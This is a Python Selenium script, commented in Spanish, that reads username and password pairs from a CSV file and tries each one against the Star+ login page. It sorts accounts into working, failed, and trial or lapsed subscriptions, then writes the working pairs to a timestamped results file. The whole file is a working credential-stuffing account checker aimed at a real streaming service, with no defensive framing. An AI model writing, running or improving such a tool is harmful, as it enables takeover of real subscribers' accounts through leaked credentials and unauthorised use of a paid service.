import os.path
import csv
import locale
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from tqdm import tqdm
from datetime import datetime

# Función para iniciar sesión
def iniciar_sesion(usuario, contrasena, credenciales_validas):
    try:
        # Inicializar el navegador Chrome
        driver = webdriver.Chrome()
        driver.maximize_window()

        # Acceder a la página de inicio de sesión de Star+
        driver.get('https://www.starplus.com/es-419/login')

        # Esperar hasta que aparezca el campo de usuario
        username_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, 'email'))
        )
        username_field.send_keys(usuario)

        # Hacer clic en 'Siguiente'
        submit_next = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div/div/div[4]/div/main/div/form/div[2]/button'))
        )
        submit_next.click()

        # Esperar hasta que aparezca el campo de contraseña
        password_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'password'))
        )
        password_field.send_keys(contrasena)

        # Hacer clic en 'Iniciar Sesión'
        submit_login = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//*[@id="password-continue-login"]'))
            
        )
        submit_login.click()

        time.sleep(8)

        # Verificar si se redirige a la página de prueba
        error_message = "Ocurrió un error al iniciar sesión."
        if driver.current_url == 'https://www.starplus.com/es-419/restart-subscription'or driver.current_url == 'https://www.starplus.com/es-419/complete-purchase':
            print(f"Las credenciales {usuario}, {contrasena} son inválidas o son de prueba.")
        elif error_message in driver.page_source:
            print(f"Las credenciales {usuario}, {contrasena} no funcionan... Intentando con el siguiente conjunto.")
        else:
            print(f"Las credenciales {usuario}, {contrasena} funcionan correctamente")
            credenciales_validas.append((usuario, contrasena))

    except NoSuchElementException:
        print(f"Las credenciales {usuario}, {contrasena} no funcionan... Intentando con el siguiente conjunto.")
    except WebDriverException as e:
        print(f"Hubo un problema al intentar iniciar sesión con {usuario}:{contrasena}")
    except Exception as e:
        # Imprimir el mensaje de error específico si lo hay
        print(str(e))
    finally:
        # Cerrar el navegador en cualquier caso
        if driver:
            driver.quit()

# Ruta al archivo CSV con las credenciales
csv_file_path = 'csv/data_starplus.csv'
credenciales_validas = []

# Verificar si el archivo CSV existe
if os.path.isfile(csv_file_path):
    # Obtener el número total de líneas en el archivo CSV
    total_lines = sum(1 for line in open(csv_file_path))

    # Abrir el archivo CSV con tqdm
    with open(csv_file_path, 'r') as csv_file:
        csv_reader = csv.reader(csv_file)

        # Iterar sobre cada línea del archivo CSV con tqdm
        for line in tqdm(csv_reader, total=total_lines, desc="Procesando credenciales", unit=" línea"):
            usuario = line[0]
            contrasena = line[1]

            # Intentar iniciar sesión con las credenciales actuales
            iniciar_sesion(usuario, contrasena, credenciales_validas)

# Guardar las credenciales válidas en un archivo .csv
if credenciales_validas:
    locale.setlocale(locale.LC_TIME, 'es_ES.UTF-8')
    now = datetime.now()
    format_date = now.strftime('%d-%b-%Y_%I-%M-%S')  # Formato de fecha en el nombre del archivo

    # Guardar las credenciales válidas en un archivo .csv
    file_path = f'results/credenciales_validas_starplus_{format_date}.csv'
    with open(file_path, 'w') as csv_file:
        for credencial in credenciales_validas:
            csv_file.write(f"{credencial[0]},{credencial[1]}\n")

    print(f"Credenciales válidas guardadas en {file_path}")
else:
    print("No hay credenciales válidas para guardar.")